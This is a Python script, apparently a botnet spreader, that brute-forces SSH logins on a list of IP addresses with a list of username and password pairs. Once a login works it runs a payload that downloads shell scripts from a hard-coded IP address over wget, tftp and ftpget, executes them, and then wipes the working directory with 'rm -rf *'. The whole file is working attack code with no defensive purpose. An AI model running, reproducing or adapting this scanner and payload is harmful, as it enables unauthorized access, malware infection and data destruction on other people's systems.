import paramiko,sys,threading,time

found = []

payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.227.85.195/GhOul.sh; chmod 777 GhOul.sh; sh GhOul.sh; tftp 188.227.85.195 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 188.227.85.195; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.227.85.195 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GhOul.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"

def Check(host):

	with open('combos.txt') as fp:
		for cn,line in enumerate(fp):
			combo = line.replace('\n','').split(':')
			if f'{host}:{combo[0]}:{combo[1]}' in found:
				pass
			else:
				#print('testing '+line)
				c = paramiko.SSHClient()

				c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				
				print(f'   [~] Testing -> {combo[0]}:{combo[1]} [{host}]')
				try:
					c.connect(hostname=host,username=combo[0].strip(),password=combo[1].strip(),timeout=1)
					print(f'      [+] Connected -> {combo[0]}:{combo[1]} [{host}]')
					found.append(f'{host}:{combo[0]}:{combo[1]}')
					c.exec_command(payload)
					print(f'         [+] Executed Payload -> {host}')
					return line
				except:
					print(f'      [-] No connection -> {combo[0]}:{combo[1]} [{host}]')
					found.append(f'{host}:{combo[0]}:{combo[1]}')

				

	return "error"

def scanner():
	with open('ips.txt') as ips:
		for cnt,line in enumerate(ips):
			if Check(line.strip())=="error":
				biggest_skid = 'Kazo & Raff'
			else:
				with open('out.txt','a') as out:
					out.write(f'{line}')

threads = []

for i in range(int(sys.argv[1])+1):
	thread = threading.Thread(target=scanner,daemon=True)
	threads.append(thread)

	print('   [~] Created Thread #'+str(i))
for thread in threads:
	thread.start()
	time.sleep(0.050)
	thread.join()
	print('   [~] Finished Thread')
